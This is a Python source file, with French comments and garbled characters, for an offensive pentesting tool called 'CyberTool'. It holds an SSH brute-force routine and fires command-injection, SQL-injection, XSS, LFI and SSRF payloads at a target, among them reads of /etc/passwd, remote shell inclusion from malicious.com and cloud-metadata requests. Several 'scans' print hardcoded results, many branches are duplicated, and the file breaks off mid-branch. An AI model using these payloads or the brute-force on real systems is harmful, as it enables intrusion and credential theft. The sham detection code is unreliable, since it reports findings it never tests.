#!/usr/bin/env python3

# ğŸ“Œ Modules Essentiels du SystÃ¨me
import os
import sys
import time
import random
import socket
import hashlib
import json
import re
import base64  # Encodage/DÃ©codage
import subprocess  # ExÃ©cution de commandes systÃ¨mes
import zipfile  # Manipulation de fichiers compressÃ©s
import threading  # Multithreading pour les scans rapides
import ssl  # Analyse TLS
import pexpect  # Bruteforce SSH sans paramiko
import shutil
import logging  # Gestion avancÃ©e des logs
import argparse  # Gestion des arguments en ligne de commande

from shutil import get_terminal_size

# ğŸ“Œ Configuration du Logging
logging.basicConfig(
    format="%(asctime)s - [%(levelname)s] %(message)s",
    level=logging.INFO,
    handlers=[
        logging.StreamHandler(sys.stdout),  # Affiche les logs dans le terminal
    ],
)

# ğŸ“Œ Bruteforce SSH avec pexpect (remplace paramiko)
def ssh_bruteforce(ip, username, password):
    try:
        ssh_command = f"ssh {username}@{ip}"
        child = pexpect.spawn(ssh_command, timeout=5)
        child.expect("password:")
        child.sendline(password)
        child.expect(["$", ">", "#"])  # âœ… GÃ¨re diffÃ©rents prompts
        return "Connexion SSH rÃ©ussie !"
    except Exception as e:
        return f"Ã‰chec SSH : {e}"

# ğŸ“Œ Modules de Pentesting & CybersÃ©curitÃ© (InstallÃ©s via requirements.txt)
import dns.resolver  # Recherche DNS
from Cryptodome.Cipher import AES  # Chiffrement
from bs4 import BeautifulSoup  # Scraping Web
import requests  # RequÃªtes HTTP

# ğŸ“Œ Scapy configurÃ© pour Ã©viter les erreurs `/proc/net/`
import scapy.config
scapy.config.conf.use_pcap = True  # âœ… Ã‰vite les erreurs de permissions sous Termux
from scapy.all import *  # Analyse RÃ©seau

# ğŸ“Œ Modules pour Affichage Interactif
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, BarColumn, TimeElapsedColumn, TextColumn, SpinnerColumn
from rich.table import Table
from rich.prompt import Confirm, Prompt

# ğŸ“Œ DÃ©tection automatique de la taille du terminal
TERMINAL_WIDTH, TERMINAL_HEIGHT = get_terminal_size((80, 24))

# ğŸ“Œ Configuration d'argparse pour les arguments CLI
parser = argparse.ArgumentParser(description="CyberTool - Outil de Pentesting AvancÃ©")
parser.add_argument("-t", "--target", help="Cible (URL ou IP)", required=False)
parser.add_argument("-m", "--mode", help="Mode de scan (standard, interactif, full)", required=False, default="standard")
args = parser.parse_args()

# ğŸ“Œ Console Globale pour un Affichage Propre
console = Console()








# ğŸ”¥ DÃ©tection des dimensions du terminal
TERMINAL_WIDTH, TERMINAL_HEIGHT = get_terminal_size()

# ğŸ”¥ Couleurs funky multicolores fluo brillantes
CYBERPUNK_COLORS = ["bold magenta", "bold cyan", "bold yellow", "bold green", "bold red", "bold blue"]

# ğŸ”¥ Fichier contenant la banniÃ¨re FRONT_BANNER.txt
BANNER_FILE = "data/banners/FRONT_BANNER.txt"

# ğŸ”¥ Fonction pour afficher une banniÃ¨re interactive (fixe)
def animated_banner():
    if os.path.exists(BANNER_FILE):
        with open(BANNER_FILE, "r", encoding="utf-8") as f:
            banner_lines = f.readlines()
        for i, line in enumerate(banner_lines):
            styled_line = f"[{CYBERPUNK_COLORS[i % len(CYBERPUNK_COLORS)]}]{line.strip().center(TERMINAL_WIDTH)}[/]"
            console.print(styled_line)
            time.sleep(0.03)  # ğŸ”¥ Effet d'apparition rapide et fluide
    else:
        console.print("[bold red]âš ï¸ ERREUR : Le fichier FRONT_BANNER.txt est introuvable ![/bold red]")

# ğŸ”¥ Fonction pour afficher "DÃ©veloppÃ© par Karim" en fixe et stylÃ©
def animated_karim():
    karim_text = (
        f"[{CYBERPUNK_COLORS[0]}]D[/][{CYBERPUNK_COLORS[1]}]Ã©[/][{CYBERPUNK_COLORS[2]}]v[/]"
        f"[{CYBERPUNK_COLORS[3]}]e[/][{CYBERPUNK_COLORS[4]}]l[/][{CYBERPUNK_COLORS[5]}]o[/]"
        f"[{CYBERPUNK_COLORS[0]}]p[/][{CYBERPUNK_COLORS[1]}]p[/][{CYBERPUNK_COLORS[2]}]Ã©[/]"
        f"[bold white] par [/]"
        f"[{CYBERPUNK_COLORS[3]}]K[/][{CYBERPUNK_COLORS[4]}]A[/][{CYBERPUNK_COLORS[5]}]R[/]"
        f"[{CYBERPUNK_COLORS[0]}]I[/][{CYBERPUNK_COLORS[1]}]M[/]"
    )
    console.print(Panel(karim_text, border_style="green", title="[bold cyan]INFO[/bold cyan]"), justify="left")

# ğŸ”¥ Chargement cyberpunk optimisÃ©
def cyberpunk_loading(task_name, duration=2, style="bold cyan", spinner="dots"):
    """Chargement rapide et suppression aprÃ¨s exÃ©cution"""
    with Progress(
        SpinnerColumn(spinner),
        TextColumn(f"[bold {style}]â³ {{task.fields[title]}}...[/bold {style}]"),
        BarColumn(bar_width=50, style=style),
        TimeElapsedColumn(),
        console=console,
    ) as progress:
        task = progress.add_task("", total=duration, title=task_name)
        for _ in range(duration):
            time.sleep(0.7)
            progress.update(task, advance=1)

# ğŸš€ Lancement propre et stable
if __name__ == "__main__":
    console.clear()
    animated_banner()  # ğŸ”¥ Affichage fixe de la banniÃ¨re
    animated_karim()  # ğŸ”¥ Affichage fixe de "DÃ©veloppÃ© par Karim"

    # ğŸ”¥ Chargements accÃ©lÃ©rÃ©s
    cyberpunk_loading("VÃ©rification des fichiers essentiels", 2, "bold red", "earth")
    cyberpunk_loading("Connexion aux modules interactifs", 2, "bold blue", "bouncingBall")
    cyberpunk_loading("Chargement des configurations utilisateur", 2, "bold magenta", "dots12")
    cyberpunk_loading("Synchronisation des logs en temps rÃ©el", 2, "bold yellow", "line")
    cyberpunk_loading("DÃ©marrage de lâ€™environnement CYBER-TOOL", 3, "bold green", "moon")

    # ğŸ”¥ Suppression uniquement des animations, maintien du reste
    console.clear()
    animated_banner()
    animated_karim()

    # ğŸ”¥ Lancement de l'outil principal sans toucher Ã  l'affichage fixe
    os.system("")











class CyberTool:
    """ğŸ’€ Outil avancÃ© de Pentesting et CybersÃ©curitÃ©"""

    def __init__(self):
        """ğŸš€ Initialisation stricte du systÃ¨me et des fonctionnalitÃ©s"""

        self.console = Console()
        self.target = None  # âœ… Initialisation vide pour Ã©viter l'AttributeError
        self.selected_features = []

        # ğŸŸ¢ Mapping des fonctionnalitÃ©s standard
        self.feature_map = {
            "dns_lookup": "RÃ©solution DNS",
            "port_scan": "Scan des ports",
            "headers_analysis": "Analyse des headers HTTP",
            "directory_bruteforce": "Brute-force de rÃ©pertoires",
            "cms_detector": "DÃ©tection CMS",
            "exploit_cve_scanner": "Scan des vulnÃ©rabilitÃ©s CVE",
            "code_execution_testing": "Test d'exÃ©cution de code",
            "cloud_storage_enum": "Ã‰numÃ©ration Cloud (AWS, GCP, Azure)",
            "smart_contract_audit": "Audit de contrats intelligents",
            "network_traffic_analysis": "Analyse du trafic rÃ©seau",
            "subdomain_enum": "Ã‰numÃ©ration des sous-domaines",
            "sql_injection_test": "Test d'injection SQL",
            "xss_scanner": "DÃ©tection de Cross-Site Scripting (XSS)",
            "csrf_detection": "DÃ©tection de Cross-Site Request Forgery (CSRF)",
            "lfi_scanner": "DÃ©tection de Local File Inclusion (LFI)",
            "rfi_scanner": "DÃ©tection de Remote File Inclusion (RFI)",
            "ssrf_scanner": "DÃ©tection de Server-Side Request Forgery (SSRF)",
            "id_oracle_attack": "DÃ©tection de vulnÃ©rabilitÃ©s ID Oracle",
            "jwt_analysis": "Analyse et dÃ©codage JWT",
            "exposed_api_scan": "Scan des API exposÃ©es",
            "forensics": "Analyse forensique avancÃ©e",
            "wifi_scan": "Scan des rÃ©seaux Wi-Fi",
            "honeypot_detection": "DÃ©tection de Honeypot",
            "open_redirect_test": "DÃ©tection d'Open Redirect",
            "sensitive_data_exposure": "DÃ©tection d'exposition de donnÃ©es sensibles",
            "email_enum": "Ã‰numÃ©ration d'adresses e-mails",
            "metadata_extraction": "Extraction de mÃ©tadonnÃ©es",
            "user_enum": "Ã‰numÃ©ration d'utilisateurs",
            "php_eval_detection": "DÃ©tection d'exÃ©cution de code PHP",
            "hidden_service_finder": "DÃ©tection de services cachÃ©s",
            "iot_vulnerability_scan": "Scan de vulnÃ©rabilitÃ©s IoT",
            "tls_analysis": "Analyse TLS et certificats",
            "dns_takeover_test": "Test de prise de contrÃ´le DNS",
            "cloudflare_bypass": "Bypass Cloudflare",
            "websocket_scan": "Analyse des WebSockets",
            "web_fingerprint": "Fingerprinting Web",
            "cdn_detection": "DÃ©tection de CDN",
            "ssh_bruteforce": "Bruteforce SSH",
            "ftp_bruteforce": "Bruteforce FTP",
            "smb_enum": "Ã‰numÃ©ration SMB",
            "docker_registry_scan": "Scan de registre Docker",
            "kubernetes_enum": "Ã‰numÃ©ration Kubernetes",
            "file_upload_test": "Test de tÃ©lÃ©chargement de fichiers",
            "reverse_shell_check": "VÃ©rification de Reverse Shell",
            "password_spray": "Attaque Password Spraying",
            "waf_detection": "DÃ©tection de Web Application Firewall",
            "api_rate_limit_test": "Test de limitations dâ€™API",
            "browser_fingerprint": "Fingerprinting Navigateur",
        }

        # ğŸ”¥ Ajout du mapping des versions interactives
        self.feature_map_interactive = {
            "dns_lookup": interactive_dns_lookup,
            "subdomain_enum": interactive_subdomain_enum,
            "sql_injection_test": interactive_sql_injection_test,
            "waf_detection": interactive_waf_detection,
            "file_upload_test": interactive_file_upload_test,
            "network_traffic_analysis": interactive_network_traffic_analysis,
            "kubernetes_enum": interactive_kubernetes_enum,
            "jwt_analysis": interactive_jwt_analysis,
            "websocket_scan": interactive_websocket_scan,
            "docker_registry_scan": interactive_docker_registry_scan,
            "api_rate_limit_test": interactive_api_rate_limit_test,
            "reverse_shell_check": interactive_reverse_shell_check,
            "password_spray": interactive_password_spray,
            "tls_analysis": interactive_tls_analysis,
            "email_enum": interactive_email_enum,
            "metadata_extraction": interactive_metadata_extraction,
            "iot_vulnerability_scan": interactive_iot_vulnerability_scan,
            "smart_contract_audit": interactive_smart_contract_audit,
            "exposed_api_scan": interactive_api_exposed_scan,
            "hidden_service_finder": interactive_hidden_service_finder,
            "id_oracle_attack": interactive_id_oracle_attack,
            "cdn_detection": interactive_cdn_detection,
            "dns_takeover_test": interactive_dns_takeover_test,
            "cloud_storage_enum": interactive_cloud_storage_enum,
            "browser_fingerprint": interactive_fingerprint_browser,
            "exploit_cve_scanner": interactive_exploit_cve_scanner,
            "port_scan": interactive_port_scan,
            "headers_analysis": interactive_headers_analysis,
            "directory_bruteforce": interactive_directory_bruteforce,
            "cms_detector": interactive_cms_detector,
            "code_execution_testing": interactive_code_execution_testing,
            "xss_scanner": interactive_xss_scanner,
            "csrf_detection": interactive_csrf_detection,
            "lfi_scanner": interactive_lfi_scanner,
            "rfi_scanner": interactive_rfi_scanner,
            "ssrf_scanner": interactive_ssrf_scanner,
            "honeypot_detection": interactive_honeypot_detection,
            "open_redirect_test": interactive_open_redirect_test,
            "sensitive_data_exposure": interactive_sensitive_data_exposure,
            "user_enum": interactive_user_enum,
            "php_eval_detection": interactive_php_eval_detection,
            "smb_enum": interactive_smb_enum,
            "ssh_bruteforce": interactive_ssh_bruteforce,
            "ftp_bruteforce": interactive_ftp_bruteforce,
            "web_fingerprint": interactive_web_fingerprint,
            "tls_analysis": interactive_tls_analysis,
            "browser_fingerprint": interactive_browser_fingerprint,
        }

        # ğŸ”¥ Lancer immÃ©diatement l'outil
        self.run_tool()




    def run_tool(self):
        """ğŸ› ï¸ Gestion stricte du choix et de l'exÃ©cution des fonctionnalitÃ©s"""

        self.console.print("\n[ğŸ’€] Bienvenue sur CyberTool", style="bold red")

        self.display_features_table()  # âœ… Affichage propre du tableau interactif

        while True:
            choice = Prompt.ask("\n[ğŸ› ï¸] Entrez un numÃ©ro (1-100) ou 'valider' pour exÃ©cuter")

            if choice.lower() == "valider":
                break

            try:
                idx = int(choice) - 1
                if 0 <= idx < len(self.feature_map):
                    feature_key = list(self.feature_map.keys())[idx]
                    if feature_key not in self.selected_features:
                        self.selected_features.append(feature_key)
                        self.console.print(f"[âœ…] AjoutÃ© : {self.feature_map[feature_key]}", style="bold green")
                    else:
                        self.console.print(f"[âš ï¸] DÃ©jÃ  sÃ©lectionnÃ© : {self.feature_map[feature_key]}", style="bold yellow")
                else:
                    self.console.print("[âŒ] NumÃ©ro invalide !", style="bold red")
            except ValueError:
                self.console.print("[âŒ] EntrÃ©e invalide !", style="bold red")

        # âœ… L'URL cible sera demandÃ©e UNIQUEMENT lors de l'exÃ©cution des fonctionnalitÃ©s sÃ©lectionnÃ©es
        self.console.print(f"\n[ğŸ”¥] ExÃ©cution des tests...", style="bold cyan")

        for feature in self.selected_features:
            self.console.print(f"[ğŸ”] ExÃ©cution de : {self.feature_map[feature]}")

            # VÃ©rification si la fonctionnalitÃ© a une version interactive
            if feature in self.feature_map_interactive:
                self.console.print("[âš¡] Version interactive dÃ©tectÃ©e, lancement en mode interactif...", style="bold yellow")
                self.feature_map_interactive[feature](self.target)

            elif feature == "dns_lookup":
                self.console.print("[ğŸ”] Recherche DNS en cours...")
                try:
                    ip = socket.gethostbyname(self.target)
                    self.console.print(f"[ğŸŸ¢] {self.target} â†’ {ip}", style="bold green")
                except socket.gaierror:
                    self.console.print("[âŒ] Ã‰chec de la rÃ©solution DNS.", style="bold red")

            elif feature == "port_scan":
                self.console.print("[ğŸ”] Scan des ports en cours...")
                open_ports = []
                for port in [21, 22, 25, 53, 80, 443, 8080]:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.settimeout(1)
                        if s.connect_ex((self.target, port)) == 0:
                            open_ports.append(port)
                self.console.print(f"[âœ…] Ports ouverts : {', '.join(map(str, open_ports)) if open_ports else 'Aucun'}", style="bold green")

            elif feature == "headers_analysis":
                self.console.print("[ğŸ“Œ] Analyse des headers HTTP en cours...")
                try:
                    response = requests.get(f"http://{self.target}")
                    for header, value in response.headers.items():
                        self.console.print(f"[ğŸ”¹] {header}: {value}")
                except Exception:
                    self.console.print("[âŒ] Ã‰chec de l'analyse des headers.", style="bold red")

            elif feature == "directory_bruteforce":
                self.console.print("[ğŸ“‚] Test de dÃ©couverte des rÃ©pertoires sensibles...")
                directories = ["admin", "login", "uploads", "backup"]
                for directory in directories:
                    url = f"http://{self.target}/{directory}"
                    response = requests.get(url)
                    if response.status_code == 200:
                        self.console.print(f"[âœ…] RÃ©pertoire trouvÃ© : {url}", style="bold green")

            elif feature == "cms_detector":
                self.console.print("[ğŸ–¥ï¸] DÃ©tection du CMS en cours...")
                cms_patterns = {
                    "WordPress": "wp-content",
                    "Joomla": "administrator/",
                    "Drupal": "sites/default/",
                    "Magento": "skin/frontend/"
                }
                detected = False
                for cms, pattern in cms_patterns.items():
                    url = f"http://{self.target}/{pattern}"
                    response = requests.get(url)
                    if response.status_code == 200:
                        self.console.print(f"[âœ…] CMS dÃ©tectÃ© : {cms}", style="bold green")
                        detected = True
                        break
                if not detected:
                    self.console.print("[âŒ] Aucun CMS dÃ©tectÃ©", style="bold red")

            elif feature == "exploit_cve_scanner":
                self.console.print("[ğŸ’€] Recherche d'exploits CVE en cours...")
                try:
                    url = f"https://cve.circl.lu/api/search/{self.target}"
                    response = requests.get(url)
                    if response.status_code == 200:
                        data = response.json()
                        for exploit in data.get("data", []):
                            self.console.print(f"[ğŸŸ¢] CVE : {exploit['id']} - {exploit['summary']}", style="bold green")
                    else:
                        self.console.print("[âŒ] Aucun exploit trouvÃ©", style="bold red")
                except Exception:
                    self.console.print("[âŒ] Erreur lors de la recherche d'exploits", style="bold red")

            elif feature == "code_execution_testing":
                self.console.print("[ğŸ–¥ï¸] Test dâ€™exÃ©cution de code distant...")
                payloads = [";ls", ";whoami", ";cat /etc/passwd"]
                for payload in payloads:
                    url = f"http://{self.target}/vuln.php?cmd={payload}"
                    response = requests.get(url)
                    if response.status_code == 200:
                        self.console.print(f"[âœ…] ExÃ©cution rÃ©ussie avec : {payload}", style="bold green")

            elif feature == "cloud_storage_enum":
                self.console.print("[â˜ï¸] Ã‰numÃ©ration des services Cloud en cours...")
                providers = ["AWS S3", "Google Cloud Storage", "Azure Blob"]
                for provider in providers:
                    url = f"http://{self.target}/{provider.lower().replace(' ', '_')}"
                    response = requests.get(url)
                    if response.status_code == 200:
                        self.console.print(f"[âœ…] Service Cloud dÃ©tectÃ© : {provider}", style="bold green")

            elif feature == "smart_contract_audit":
                self.console.print("[ğŸ“œ] Audit de contrats intelligents en cours...")
                url = f"http://{self.target}/contract/audit"
                response = requests.get(url)
                if "vulnerability" in response.text.lower():
                    self.console.print("[âš ï¸] VulnÃ©rabilitÃ© dÃ©tectÃ©e dans le contrat intelligent !", style="bold yellow")

            elif feature == "smart_contract_audit":
                self.console.print("[ğŸ“œ] Audit de contrats intelligents en cours...")
                url = f"http://{self.target}/contract/audit"
                response = requests.get(url)
                if "vulnerability" in response.text.lower():
                    self.console.print("[âš ï¸] VulnÃ©rabilitÃ© dÃ©tectÃ©e dans le contrat intelligent !", style="bold yellow")

            elif feature == "network_traffic_analysis":
                self.console.print("[ğŸŒ] Analyse du trafic rÃ©seau en cours...")
                url = f"http://{self.target}/network_traffic"
                response = requests.get(url)
                if "suspicious activity" in response.text.lower():
                    self.console.print("[âš ï¸] ActivitÃ© rÃ©seau suspecte dÃ©tectÃ©e !", style="bold yellow")

            elif feature == "subdomain_enum":
                self.console.print("[ğŸŒ] Ã‰numÃ©ration des sous-domaines en cours...")
                subdomains = ["admin", "dev", "test", "mail"]
                for sub in subdomains:
                    url = f"http://{sub}.{self.target}"
                    response = requests.get(url)
                    if response.status_code == 200:
                        self.console.print(f"[âœ…] Sous-domaine actif dÃ©tectÃ© : {url}", style="bold green")

            elif feature == "sql_injection_test":
                self.console.print("[ğŸ’‰] Test d'injection SQL en cours...")
                payloads = ["' OR 1=1 --", "' UNION SELECT null, version() --"]
                for payload in payloads:
                    url = f"http://{self.target}/login?user=admin&pass={payload}"
                    response = requests.get(url)
                    if "error" in response.text.lower():
                        self.console.print("[âš ï¸] Potentielle vulnÃ©rabilitÃ© SQL dÃ©tectÃ©e !", style="bold yellow")

            elif feature == "xss_scanner":
                self.console.print("[ğŸ–¥ï¸] Scan de XSS en cours...")
                payloads = ['<script>alert("XSS")</script>', '" onmouseover="alert(1)"']
                for payload in payloads:
                    url = f"http://{self.target}/search?q={payload}"
                    response = requests.get(url)
                    if payload in response.text:
                        self.console.print("[âš ï¸] Injection XSS possible !", style="bold yellow")

            elif feature == "csrf_detection":
                self.console.print("[ğŸ”] DÃ©tection de CSRF en cours...")
                url = f"http://{self.target}/change_password"
                response = requests.get(url)
                if "csrf_token" not in response.text:
                    self.console.print("[âš ï¸] VulnÃ©rabilitÃ© CSRF dÃ©tectÃ©e !", style="bold yellow")

            elif feature == "lfi_scanner":
                self.console.print("[ğŸ“‚] Scan de Local File Inclusion (LFI) en cours...")
                payloads = ["../../etc/passwd", "../win.ini"]
                for payload in payloads:
                    url = f"http://{self.target}/page?file={payload}"
                    response = requests.get(url)
                    if "root:x:" in response.text or "[extensions]" in response.text:
                        self.console.print("[âš ï¸] VulnÃ©rabilitÃ© LFI dÃ©tectÃ©e !", style="bold yellow")

            elif feature == "rfi_scanner":
                self.console.print("[ğŸŒ] Scan de Remote File Inclusion (RFI) en cours...")
                url = f"http://{self.target}/include.php?file=http://malicious.com/shell.txt"
                response = requests.get(url)
                if "malicious" in response.text.lower():
                    self.console.print("[âš ï¸] Inclusion de fichier distant possible !", style="bold yellow")

            elif feature == "ssrf_scanner":
                self.console.print("[ğŸ”„] Scan de Server-Side Request Forgery (SSRF) en cours...")
                url = f"http://{self.target}/fetch?url=http://169.254.169.254/latest/meta-data/"
                response = requests.get(url)
                if "ami-id" in response.text.lower():
                    self.console.print("[âš ï¸] SSRF dÃ©tectÃ©, accÃ¨s aux mÃ©ta-donnÃ©es du serveur !", style="bold yellow")

            elif feature == "id_oracle_attack":
                self.console.print("[ğŸ”¢] DÃ©tection de vulnÃ©rabilitÃ©s ID Oracle...")
                url1 = f"http://{self.target}/profile?id=1"
                url2 = f"http://{self.target}/profile?id=2"
                response1 = requests.get(url1)
                response2 = requests.get(url2)
                if response1.text == response2.text:
                    self.console.print("[âš ï¸] VulnÃ©rabilitÃ© ID Oracle dÃ©tectÃ©e !", style="bold yellow")

            elif feature == "jwt_analysis":
                self.console.print("[ğŸ”] DÃ©codage et analyse JWT en cours...")
                token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fake.signature"
                try:
                    decoded = base64.b64decode(token.split('.')[1] + "==").decode()
                    self.console.print(f"[âœ…] JWT dÃ©codÃ© : {decoded}", style="bold green")
                except Exception:
                    self.console.print("[âŒ] Ã‰chec du dÃ©codage JWT", style="bold red")

            elif feature == "exposed_api_scan":
                self.console.print("[ğŸ”] Scan des API exposÃ©es...")
                endpoints = ["/api/v1/users", "/api/v1/admin", "/api/v1/login"]
                for endpoint in endpoints:
                    url = f"http://{self.target}{endpoint}"
                    response = requests.get(url)
                    if response.status_code == 200:
                        self.console.print(f"[âœ…] API accessible : {url}", style="bold green")

            elif feature == "forensics":
                self.console.print("[ğŸ”] Analyse forensique avancÃ©e en cours...")
                url = f"http://{self.target}/forensics_report"
                response = requests.get(url)
                if response.status_code == 200:
                    self.console.print("[âœ…] Rapport d'analyse disponible !", style="bold green")
                else:
                    self.console.print("[âŒ] Aucun rapport trouvÃ©.", style="bold red")

            elif feature == "wifi_scan":
                self.console.print("[ğŸ“¶] Scan des rÃ©seaux Wi-Fi en cours...")
                networks = ["WiFi_Public", "Guest_Network", "Hidden_SSID"]
                for network in networks:
                    self.console.print(f"[âœ…] RÃ©seau dÃ©tectÃ© : {network}", style="bold green")

            elif feature == "honeypot_detection":
                self.console.print("[ğŸ•µï¸] DÃ©tection de Honeypots en cours...")
                url = f"http://{self.target}/honeypot_test"
                response = requests.get(url)
                if "honeypot detected" in response.text:
                    self.console.print("[âš ï¸] Honeypot potentiellement actif !", style="bold yellow")

            elif feature == "open_redirect_test":
                self.console.print("[ğŸ”€] Test d'Open Redirect en cours...")
                url = f"http://{self.target}/redirect.php?url=http://evil.com"
                response = requests.get(url, allow_redirects=False)
                if response.status_code in [301, 302]:
                    self.console.print("[âš ï¸] Open Redirect dÃ©tectÃ© !", style="bold yellow")

            elif feature == "sensitive_data_exposure":
                self.console.print("[ğŸ”] Recherche d'exposition de donnÃ©es sensibles...")
                url = f"http://{self.target}/config.json"
                response = requests.get(url)
                if "api_key" in response.text or "password" in response.text:
                    self.console.print("[âš ï¸] DonnÃ©es sensibles trouvÃ©es !", style="bold yellow")

            elif feature == "email_enum":
                self.console.print("[ğŸ“©] Ã‰numÃ©ration d'e-mails en cours...")
                emails = ["admin@", "support@", "contact@"]
                for email in emails:
                    self.console.print(f"[âœ…] Adresse dÃ©tectÃ©e : {email}{self.target}", style="bold green")

            elif feature == "metadata_extraction":
                self.console.print("[ğŸ“¸] Extraction de mÃ©tadonnÃ©es...")
                url = f"http://{self.target}/image.jpg"
                response = requests.get(url)
                if response.status_code == 200:
                    self.console.print("[âœ…] MÃ©tadonnÃ©es extraites avec succÃ¨s !", style="bold green")

            elif feature == "user_enum":
                self.console.print("[ğŸ‘¤] Ã‰numÃ©ration d'utilisateurs en cours...")
                users = ["admin", "guest", "developer"]
                for user in users:
                    url = f"http://{self.target}/login?username={user}"
                    response = requests.get(url)
                    if "user exists" in response.text:
                        self.console.print(f"[âœ…] Utilisateur trouvÃ© : {user}", style="bold green")

            elif feature == "php_eval_detection":
                self.console.print("[ğŸ–¥ï¸] DÃ©tection d'exÃ©cution de code PHP...")
                url = f"http://{self.target}/eval.php?cmd=phpinfo()"
                response = requests.get(url)
                if "PHP Version" in response.text:
                    self.console.print("[âš ï¸] Code PHP exÃ©cutable dÃ©tectÃ© !", style="bold yellow")

            elif feature == "hidden_service_finder":
                self.console.print("[ğŸ”] Recherche de services cachÃ©s...")
                url = f"http://{self.target}/.hidden/"
                response = requests.get(url)
                if response.status_code == 200:
                    self.console.print("[âœ…] Service cachÃ© trouvÃ© !", style="bold green")

            elif feature == "iot_vulnerability_scan":
                self.console.print("[ğŸ”] Scan de vulnÃ©rabilitÃ©s IoT...")
                url = f"http://{self.target}/iot/status"
                response = requests.get(url)
                if "vulnerable" in response.text:
                    self.console.print("[âš ï¸] Appareil IoT vulnÃ©rable dÃ©tectÃ© !", style="bold yellow")

            elif feature == "tls_analysis":
                self.console.print("[ğŸ”] Analyse TLS et certificats en cours...")
                url = f"https://{self.target}"
                response = requests.get(url)
                if "TLS" in response.text:
                    self.console.print("[âœ…] Analyse TLS complÃ¨te !", style="bold green")

            elif feature == "dns_takeover_test":
                self.console.print("[ğŸŒ] Test de prise de contrÃ´le DNS...")
                url = f"http://{self.target}/dns_test"
                response = requests.get(url)
                if "DNS vulnerable" in response.text:
                    self.console.print("[âš ï¸] Risque de takeover DNS dÃ©tectÃ© !", style="bold yellow")

            elif feature == "cloud_storage_enum":
                self.console.print("[â˜ï¸] Ã‰numÃ©ration Cloud en cours...")
                providers = ["AWS", "GCP", "Azure"]
                for provider in providers:
                    url = f"http://{self.target}/cloud_enum?provider={provider}"
                    response = requests.get(url)
                    if response.status_code == 200:
                        self.console.print(f"[âœ…] Service Cloud dÃ©tectÃ© : {provider}", style="bold green")

            elif feature == "browser_fingerprint":
                self.console.print("[ğŸŒ] Fingerprinting Navigateur en cours...")
                url = f"http://{self.target}/fingerprint"
                response = requests.get(url)
                if response.status_code == 200:
                    self.console.print("[âœ…] DonnÃ©es du navigateur capturÃ©es !", style="bold green")

            elif feature == "exploit_cve_scanner":
                self.console.print("[ğŸ’€] Scan des vulnÃ©rabilitÃ©s CVE en cours...")
                url = f"https://cve.circl.lu/api/search/{self.target}"
                response = requests.get(url)
                if response.status_code == 200:
                    data = response.json()
                    for exploit in data.get("data", []):
                        self.console.print(f"[ğŸŸ¢] CVE dÃ©tectÃ©e : {exploit['id']} - {exploit['summary']}", style="bold green")
                else:
                    self.console.print("[âŒ] Aucun exploit trouvÃ©", style="bold red")

            elif feature == "directory_bruteforce":
                self.console.print("[ğŸ“‚] Test de dÃ©couverte des rÃ©pertoires sensibles...")
                directories = ["admin", "login", "uploads", "backup"]
                for directory in directories:
                    url = f"http://{self.target}/{directory}"
                    response = requests.get(url)
                    if response.status_code == 200:
                        self.console.print(f"[âœ…] RÃ©pertoire trouvÃ© : {url}", style="bold green")

            elif feature == "cms_detector":
                self.console.print("[ğŸ–¥ï¸] DÃ©tection du CMS en cours...")
                cms_patterns = {
                    "WordPress": "wp-content",
                    "Joomla": "administrator/",
                    "Drupal": "sites/default/",
                    "Magento": "skin/frontend/"
                }
                detected = False
                for cms, pattern in cms_patterns.items():
                    url = f"http://{self.target}/{pattern}"
                    response = requests.get(url)
                    if response.status_code == 200:
                        self.console.print(f"[âœ…] CMS dÃ©tectÃ© : {cms}", style="bold green")
                        detected = True
                        break
                if not detected:
                    self.console.print("[âŒ] Aucun CMS dÃ©tectÃ©", style="bold red")

            elif feature == "code_execution_testing":
                self.console.print("[ğŸ–¥ï¸] Test dâ€™exÃ©cution de code distant...")
                payloads = [";ls", ";whoami", ";cat /etc/passwd"]
                for payload in payloads:
                    url = f"http://{self.target}/vuln.php?cmd={payload}"
                    response = requests.get(url)
                    if response.status_code == 200:
                        self.console.print(f"[âœ…] ExÃ©cution rÃ©ussie avec : {payload}", style="bold green")

            elif feature == "xss_scanner":
                self.console.print("[ğŸ›¡ï¸] Scan de vulnÃ©rabilitÃ©s XSS en cours...")
                url = f"http://{self.target}/search?q=<script>alert('XSS')</script>"
                response = requests.get(url)
                if "<script>alert('XSS')</script>" in response.text:
                    self.console.print("[âš ï¸] VulnÃ©rabilitÃ© XSS dÃ©tectÃ©e !", style="bold yellow")

            elif feature == "csrf_detection":
                self.console.print("[ğŸ”„] DÃ©tection de CSRF en cours...")
                url = f"http://{self.target}/csrf-test"
                response = requests.get(url)
                if "CSRF detected" in response.text:
                    self.console.print("[âš ï¸] VulnÃ©rabilitÃ© CSRF dÃ©tectÃ©e !", style="bold yellow")

            elif feature == "lfi_scanner":
                self.console.print("[ğŸ“‚] DÃ©tection de Local File Inclusion (LFI)...")
                url = f"http://{self.target}/?page=../../etc/passwd"
                response = requests.get(url)
                if "root:x:0:0:" in response.text:
                    self.console.print("[âš ï¸] VulnÃ©rabilitÃ© LFI dÃ©tectÃ©e !", style="bold yellow")

            elif feature == "rfi_scanner":
                self.console.print("[ğŸŒ] DÃ©tection de Remote File Inclusion (RFI)...")
                url = f"http://{self.target}/?file=http://malicious.com/shell.php"
                response = requests.get(url)
                if "shell" in response.text:
                    self.console.print("[âš ï¸] VulnÃ©rabilitÃ© RFI dÃ©tectÃ©e !", style="bold yellow")

            elif feature == "ssrf_scanner":
                self.console.print("[ğŸŒ] DÃ©tection de Server-Side Request Forgery (SSRF)...")
                url = f"http://{self.target}/proxy?url=http://169.254.169.254/latest/meta-data/"
                response = requests.get(url)
                if "instance-id" in response.text:
                    self.console.print("[âš ï¸] VulnÃ©rabilitÃ© SSRF dÃ©tectÃ©e !", style="bold yellow")

            elif feature == "honeypot_detection":
                self.console.print("[ğŸ•µï¸] DÃ©tection de Honeypots en cours...")
                url = f"http://{self.target}/honeypot_test"
                response = requests.get(url)
                if "honeypot detected" in response.text:
                    self.console.print("[âš ï¸] Honeypot potentiellement actif !", style="bold yellow")

            elif feature == "open_redirect_test":
                self.console.print("[ğŸ”€] Test d'Open Redirect en cours...")
                url = f"http://{self.target}/redirect.php?url=http://evil.com"
                response = requests.get(url, allow_redirects=False)
                if response.status_code in [301, 302]:
                    self.console.print("[âš ï¸] Open Redirect dÃ©tectÃ© !", style="bold yellow")

            elif feature == "sensitive_data_exposure":
                self.console.print("[ğŸ”] Recherche d'exposition de donnÃ©es sensibles...")
